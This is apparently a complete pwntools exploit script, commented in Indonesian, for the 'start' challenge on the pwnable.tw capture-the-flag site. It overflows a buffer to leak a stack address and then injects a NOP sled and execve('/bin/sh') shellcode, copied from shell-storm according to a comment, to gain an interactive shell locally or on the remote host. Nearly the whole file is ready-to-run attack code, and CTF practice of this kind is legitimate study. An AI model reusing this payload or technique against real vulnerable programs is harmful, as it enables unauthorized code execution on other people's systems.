#!/usr/bin/python
import sys
from pwn import *

host = 'chall.pwnable.tw'
port = 10000

def exploit (r):

	# shellcode dicuri dari http://shell-storm.org/shellcode/files/shellcode-811.php
	shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73"
	shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
	shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
	shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"

	# waktu alamat stack dicopy ke ECX
	mov_ecx_esp = p32 (0x08048087)

	# membocorkan stack
	payload = 'A' * 20 + mov_ecx_esp

	print r.recvuntil (":")
	r.send (payload)

	# bocorannya
	leak = r.recv (4)
	stack = u32 (leak)

	print 'Alamat stack adalah: ', format (hex (stack))

	# payload sebenarnya ('A' 20 byte + letak payload kita + nop-sled 4 byte buat jaga-jaga + shellcode 28 byte)
	payload2 = 'A' * 20 + p32 (stack + 20) + '\x90' * 4 + shellcode

	r.sendline (payload2)
	r.interactive ()


if __name__ == "__main__":
	e = ELF ('./start')

	if len (sys.argv) > 1:
		r = remote (host, port)
		exploit (r)
	else:
		r = process ('./start')
		exploit (r)
